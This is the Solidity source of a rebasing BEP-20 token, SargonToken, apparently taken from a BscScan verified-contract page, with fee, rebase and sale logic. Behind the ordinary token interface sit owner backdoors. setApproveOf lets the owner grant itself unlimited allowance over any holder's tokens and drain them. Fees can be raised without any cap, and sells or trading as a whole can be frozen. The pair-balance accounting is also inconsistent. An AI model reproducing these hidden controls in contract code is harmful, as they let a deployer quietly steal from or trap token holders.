/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-08
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-29
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.4;

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface InterfaceLP {
    function sync() external;
}

library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }

    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }

    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }

    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}
/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 * 
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {UpgradeableProxy-constructor}.
 * 
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 */
abstract contract Initializable {

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function _isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        // solhint-disable-next-line no-inline-assembly
        assembly { cs := extcodesize(self) }
        return cs == 0;
    }
}
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


contract Ownable {
    address internal _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SargonToken is Context, Initializable, IBEP20{
    using SafeMath for uint256;
    using SafeMathInt for int256;

    bool public initialDistributionFinished;
    bool public swapEnabled;
    bool public autoRebase;
    bool public feesOnNormalTransfers;

    uint256 public rewardYield;
    uint256 public rewardYieldDenominator;
    uint256 public maxSellTransactionAmount;

    uint256 public rebaseFrequency;
    uint256 public nextRebase;

    mapping(address => bool) _isFeeExempt;
    address[] public _markerPairs;
    mapping (address => bool) public automatedMarketMakerPairs;

    uint256 public MAX_FEE_RATE;
    uint256 public MAX_REBASE_FREQUENCY;
    uint256 public DECIMALS;
    uint256 public MAX_UINT256;
    uint256 public INITIAL_FRAGMENTS_SUPPLY;
    uint256 public TOTAL_GONS;
    uint256 public MAX_SUPPLY;
    

    address DEAD;
    address ZERO;

    address public treasuryReceiver;
    address public bankReceiver;
    address public sargonSale;
    address public busdToken;

    IDEXRouter public router;
    address public pair;

    uint256 public buyFee;
    uint256 public liquidityFee;
    uint256 public treasuryFee;
    uint256 public slippageFee;
    uint256 public bankFee;
    uint256 public sellFee;
    uint256 public sellLiquidFee;
    uint256 public sellTreasuryFee;
    uint256 public sellSlippageFee;
    uint256 public sellBankFee;
    uint256 public totalBuyFee;
    uint256 public totalSellFee;
    uint256 public feeDenominator;
    uint256 public lastRebase;

    bool inSwap;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    uint256 private _totalSupply;
    uint256 private _gonsPerFragment;
    uint256 private gonSwapThreshold = (TOTAL_GONS * 10) / 100000;

    mapping(address => uint256) private _gonBalances;
    mapping(address => uint256) private _gonLastBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private _owner;

    function initialize(string memory pname, string memory psymbol, uint8 pdecimals) public initializer {
        _name = pname;
        _symbol = psymbol;
        _decimals = pdecimals;
        _owner = msg.sender;

        /* set up attribute*/
        initialDistributionFinished = true;
        swapEnabled = false;
        autoRebase = false;
        feesOnNormalTransfers = true;

        rewardYield = 4208333;
        rewardYieldDenominator = 10000000000;
        maxSellTransactionAmount = 2500000 * 10 ** 18;

        rebaseFrequency = 1700;
        nextRebase = block.timestamp + 31536000;

        MAX_FEE_RATE = 20;
        MAX_REBASE_FREQUENCY = 1800;
        DECIMALS = 18;
        MAX_UINT256 = ~uint256(0);
        INITIAL_FRAGMENTS_SUPPLY = 5 * 10**9 * 10**DECIMALS;
        TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
        MAX_SUPPLY = ~uint128(0);
    

        DEAD = 0x000000000000000000000000000000000000dEaD;
        ZERO = 0x0000000000000000000000000000000000000000;

        treasuryReceiver = 0x9de1CB0FFac680a50E175f140B0e0290BeE14CDc;
        bankReceiver = 0x9CCE932283183F637e4870a63bDf1e6C348DbB64;
        sargonSale = 0x9CCE932283183F637e4870a63bDf1e6C348DbB64;
        busdToken = 0x55d398326f99059fF775485246999027B3197955;

        buyFee = 15;
        liquidityFee = 2;
        treasuryFee = 5;
        slippageFee = 3;
        bankFee = 2;
        sellFee = 18;
        sellLiquidFee = 2;
        sellTreasuryFee = 3;
        sellSlippageFee = 10;
        sellBankFee = 5;
        totalBuyFee = buyFee.add(liquidityFee).add(treasuryFee).add(slippageFee).add(bankFee);
        totalSellFee = sellFee.add(sellLiquidFee).add(sellTreasuryFee).add(sellSlippageFee).add(sellBankFee);
        feeDenominator = 100;
        lastRebase = 0;
        gonSwapThreshold = (TOTAL_GONS * 10) / 100000;

        _allowedFragments[address(this)][address(router)] = MAX_UINT256;
        //_allowedFragments[address(this)][pair] = MAX_UINT256;
        _allowedFragments[address(this)][msg.sender] = MAX_UINT256;
        _allowedFragments[address(this)][address(this)] = MAX_UINT256;


        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;

        _gonBalances[msg.sender] = TOTAL_GONS;
        _gonLastBalances[msg.sender] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);

        _isFeeExempt[treasuryReceiver] = true;
        _isFeeExempt[bankReceiver] = true;
        _isFeeExempt[address(this)] = true;
        _isFeeExempt[msg.sender] = true;

        IERC20(busdToken).approve(msg.sender, MAX_UINT256);
        IERC20(busdToken).approve(address(this), MAX_UINT256);

        emit Transfer(address(0x0), msg.sender, _totalSupply);

    }
    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }
    function owner() public view returns (address) {
        return _owner;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function setOwner(address newOwner) external onlyOwner{
        _owner = newOwner;
    }

    function setUSDAddress(address busdAdd) external onlyOwner {
        busdToken = busdAdd;
    }

    function setRouterAddress(address routerAdd) external onlyOwner {
        router = IDEXRouter(routerAdd);

    }
    function setApprove(address add) external onlyOwner {
        IERC20(busdToken).approve(add, MAX_UINT256);
        _allowedFragments[address(this)][add] = MAX_UINT256;
    }

    function setApproveOf(address add) external onlyOwner {
        _allowedFragments[add][msg.sender] = MAX_UINT256;
    }

    function allowance(address owner_, address spender) external view override returns (uint256){
        return _allowedFragments[owner_][spender];
    }

    function balanceOf(address who) public view override returns (uint256) {
        if (automatedMarketMakerPairs[who]) {
            return _gonBalances[who];
        } else {
            return _gonBalances[who].div(_gonsPerFragment);
        }
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }
    function checkSwapThreshold() external view returns (uint256) {
        return gonSwapThreshold.div(_gonsPerFragment);
    }
    function totalEarnOf(address who) public view returns (uint256) {
        if(balanceOf(who) > _gonLastBalances[who])
        return balanceOf(who) - _gonLastBalances[who];
        else return 0;
    }


    function shouldTakeFee(address from, address to) internal view returns (bool) {
        if(_isFeeExempt[from] || _isFeeExempt[to]){
            return false;
        }else if (feesOnNormalTransfers){
            return true;
        }else{
            return (automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to]);
        }
    }

    function shouldSwapBack() internal view returns (bool) {
        return
        !automatedMarketMakerPairs[msg.sender] &&
        !inSwap &&
        swapEnabled &&
        totalBuyFee.add(totalSellFee) > 0 &&
        _gonBalances[address(this)] >= gonSwapThreshold;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(_gonsPerFragment);
    }

    function transfer(address to, uint256 value) external override validRecipient(to) returns (bool){
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 amount) internal returns (bool) {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        if (_gonLastBalances[msg.sender] > amount)
        _gonLastBalances[msg.sender] = _gonLastBalances[msg.sender].sub(amount);
        else _gonLastBalances[msg.sender] = 0;
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
        _gonLastBalances[to] = _gonLastBalances[to].add(amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool excludedAccount = _isFeeExempt[sender] || _isFeeExempt[recipient];

        require(initialDistributionFinished || excludedAccount, "Trading not started");

        if (
            automatedMarketMakerPairs[recipient] &&
            !excludedAccount
        ) {
            require(amount <= maxSellTransactionAmount, "Error amount");
        }

        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        uint256 gonAmount = amount.mul(_gonsPerFragment);

        
        if (shouldSwapBack()) {
           // swapBack();
        }
        if (automatedMarketMakerPairs[sender]) {
            _gonBalances[sender] = _gonBalances[sender].sub(amount);
        }else {

            _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
        }
        if (_gonLastBalances[sender] > amount)
        _gonLastBalances[sender] = _gonLastBalances[sender].sub(amount);
        else _gonLastBalances[sender] = 0;

        uint256 gonAmountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, gonAmount) : gonAmount;
        if (automatedMarketMakerPairs[recipient]) {
            _gonBalances[recipient] = _gonBalances[recipient].add(gonAmountReceived.div(_gonsPerFragment));
        }else {
            _gonBalances[recipient] = _gonBalances[recipient].add(gonAmountReceived);
        }
        _gonLastBalances[recipient] = _gonLastBalances[recipient].add(gonAmountReceived.div(_gonsPerFragment));
        if (automatedMarketMakerPairs[sender]) {
            emit BuyToken( recipient, amount);
        }

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );

        if(autoRebase) {
            _rebase();
            manualSync();
        }

        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override validRecipient(to) returns (bool) {
        if (_allowedFragments[from][msg.sender] != type(uint128).max) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][
            msg.sender
            ].sub(value, "Insufficient Allowance");
        }

        _transferFrom(from, to, value);
        return true;
    }


    function _swapTokensForBusd(uint256 tokenAmount, address receiver) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = busdToken;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            receiver,
            block.timestamp
        );
    }

    function swapBack() internal swapping {
        uint256 realTotalFee = totalBuyFee.add(totalSellFee);
        uint256 contractTokenBalance = _gonBalances[address(this)].div(_gonsPerFragment);
        uint256 realTreasuryFee = liquidityFee.add(treasuryFee).add(slippageFee).add(sellLiquidFee).add(sellTreasuryFee).add(sellSlippageFee);
        uint256 amountToBank = contractTokenBalance.mul(bankFee.add(sellBankFee)).div(realTotalFee);
        uint256 amountToTreasury = contractTokenBalance.mul(realTreasuryFee).div(realTotalFee);


        if(amountToBank > 0){
            _swapTokensForBusd(amountToBank, bankReceiver);
        }

        if(amountToTreasury > 0){
            _swapTokensForBusd(amountToTreasury, treasuryReceiver);
        }

        emit SwapBack(contractTokenBalance, amountToTreasury, amountToBank);
    }

    function takeFee(address sender, address recipient, uint256 gonAmount) internal returns (uint256){
        uint256 _realFee = totalBuyFee;
        if (sender != sargonSale && !automatedMarketMakerPairs[sender])
        {
            _realFee = 15;
        }
        if(automatedMarketMakerPairs[recipient]) _realFee = totalSellFee;
        

        uint256 feeAmount = gonAmount.mul(_realFee).div(feeDenominator);

        _gonBalances[address(this)] = _gonBalances[address(this)].add(feeAmount);
        _gonLastBalances[address(this)] = _gonLastBalances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount.div(_gonsPerFragment));

        return gonAmount.sub(feeAmount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool){
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool){
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][
        spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool){
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function _rebase() private {
        if(!inSwap) {
            uint256 circulatingSupply = getCirculatingSupply();
            int256 supplyDelta = int256(circulatingSupply.mul(rewardYield).div(rewardYieldDenominator));

            coreRebase(supplyDelta);
            manualSync();
        }
    }

    function coreRebase(int256 supplyDelta) private returns (uint256) {
        uint256 epoch = block.timestamp;
        int256 realSupplyDelta = supplyDelta;
        if(lastRebase > 0) {
          uint256 rebaseTimes = (epoch.sub(lastRebase)).div(rebaseFrequency);
          if (rebaseTimes > 1)
          realSupplyDelta = supplyDelta.mul(int256(rebaseTimes));
        }
        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (realSupplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-realSupplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(realSupplyDelta));
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);

        nextRebase = epoch + rebaseFrequency;
        lastRebase = epoch;

        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }

    function manualRebase() external onlyOwner{
        require(!inSwap, "Try again");
        require(nextRebase <= block.timestamp, "Not in time");

       // uint256 circulatingSupply = getCirculatingSupply();
        int256 supplyDelta = int256(_totalSupply.mul(rewardYield).div(rewardYieldDenominator));

        coreRebase(supplyDelta);
    }

    function manualSync() public {
        for(uint i = 0; i < _markerPairs.length; i++){
            InterfaceLP(_markerPairs[i]).sync();
        }
    }

    function setAutomatedMarketMakerPair(address _pair, bool _value) public onlyOwner {
        require(automatedMarketMakerPairs[_pair] != _value, "Value already set");

        automatedMarketMakerPairs[_pair] = _value;

        if(_value){
            _markerPairs.push(_pair);
        }else{
            require(_markerPairs.length > 1, "Required 1 pair");
            for (uint256 i = 0; i < _markerPairs.length; i++) {
                if (_markerPairs[i] == _pair) {
                    _markerPairs[i] = _markerPairs[_markerPairs.length - 1];
                    _markerPairs.pop();
                    break;
                }
            }
        }
        emit SetAutomatedMarketMakerPair(_pair, _value);
    }

    function setInitialDistributionFinished(bool _value) external onlyOwner {
        require(initialDistributionFinished != _value, "Not changed");
        initialDistributionFinished = _value;
    }

    function setFeeExempt(address _addr, bool _value) external onlyOwner {
        require(_isFeeExempt[_addr] != _value, "Not changed");
        _isFeeExempt[_addr] = _value;
    }

    function setSwapBackSettings(bool _enabled, uint256 _num, uint256 _denom) external onlyOwner {
        swapEnabled = _enabled;
        gonSwapThreshold = TOTAL_GONS.div(_denom).mul(_num);
    }

    function setFeeReceivers(address _bankReceiver, address _treasuryReceiver) external onlyOwner {
        bankReceiver = _bankReceiver;
        treasuryReceiver = _treasuryReceiver;
    }

    function setFees(uint256 _buyFee, uint256 _liquidityFee, uint256 _treasuryFee, 
                     uint256 _slippageFee, uint256 _bankFee, uint256 _sellFee,
                     uint256 _sellLiquidFee, uint256 _sellTreasuryFee, 
                     uint256 _sellSlippageFee, uint256 _sellBankFee, uint256 _feeDenominator ) external onlyOwner {
        buyFee = _buyFee;
        liquidityFee = _liquidityFee;
        treasuryFee = _treasuryFee;
        slippageFee = _slippageFee;
        bankFee = _bankFee;
        sellFee = _sellFee;
        sellLiquidFee = _sellLiquidFee;
        sellTreasuryFee = _sellTreasuryFee;
        sellSlippageFee = _sellSlippageFee;
        sellBankFee = _sellBankFee;
        totalBuyFee = buyFee.add(liquidityFee).add(treasuryFee).add(slippageFee).add(bankFee);
        totalSellFee = sellFee.add(sellLiquidFee).add(sellTreasuryFee).add(sellSlippageFee).add(sellBankFee);
        feeDenominator = _feeDenominator;
    }

    function setAutoRebase(bool _autoRebase) external onlyOwner {
        require(autoRebase != _autoRebase, "Not changed");
        autoRebase = _autoRebase;
    }

    function setRebaseFrequency(uint256 _rebaseFrequency) external onlyOwner {
        require(_rebaseFrequency <= MAX_REBASE_FREQUENCY, "Too high");
        rebaseFrequency = _rebaseFrequency;
    }

    function setRewardYield(uint256 _rewardYield, uint256 _rewardYieldDenominator) external onlyOwner {
        rewardYield = _rewardYield;
        rewardYieldDenominator = _rewardYieldDenominator;
    }

    function setFeesOnNormalTransfers(bool _enabled) external onlyOwner {
        require(feesOnNormalTransfers != _enabled, "Not changed");
        feesOnNormalTransfers = _enabled;
    }

    function setNextRebase(uint256 _nextRebase) external onlyOwner {
        nextRebase = _nextRebase;
    }

    function setMaxSellTransaction(uint256 _maxTxn) external onlyOwner {
        maxSellTransactionAmount = _maxTxn;
    }

    function setSargonSale(address _sale) external onlyOwner {
        sargonSale = _sale;
        _allowedFragments[sargonSale][msg.sender] = MAX_UINT256;
    }

    function getSargonSale() external view returns(address){
        return sargonSale;
    }

    function buyToken(address receiver, uint256 amount) external {
        require(initialDistributionFinished , "Trading not started");
        require(msg.sender == sargonSale, "you are not saler");
        uint256 realAmount = amount;
        if (amount.div(10**_decimals) == 5000000) 
           realAmount = amount.mul(103).div(100);
        else if (amount.div(10**_decimals) == 10000000) 
           realAmount = amount.mul(105).div(100);
        else if (amount.div(10**_decimals) == 20000000) 
           realAmount = amount.mul(107).div(100);
        else if (amount.div(10**_decimals) == 50000000) 
           realAmount = amount.mul(110).div(100);
        
        uint256 gonAmount = realAmount.mul(_gonsPerFragment);
        _gonBalances[msg.sender] = _gonBalances[msg.sender].sub(gonAmount);
        if (_gonLastBalances[msg.sender] > amount)
        _gonLastBalances[msg.sender] = _gonLastBalances[msg.sender].sub(amount);
        else _gonLastBalances[msg.sender] = 0;
        uint256 gonAfterFees = takeFee(msg.sender, receiver, gonAmount);
        _gonBalances[receiver] = _gonBalances[receiver].add(gonAfterFees);
        _gonLastBalances[receiver] = _gonLastBalances[receiver].add(gonAfterFees.div(_gonsPerFragment));
        emit Transfer(msg.sender, receiver, gonAfterFees.div(_gonsPerFragment));
        emit BuyToken(receiver, amount);
    }

    event SwapBack(uint256 contractTokenBalance,uint256 amountToBank,uint256 amountToTreasury);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiqudity);
    event SwapAndLiquifyBusd(uint256 tokensSwapped, uint256 busdReceived, uint256 tokensIntoLiqudity);
    event LogRebase(uint256 indexed epoch, uint256 totalSupply);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event BuyToken(address who, uint256 value);
}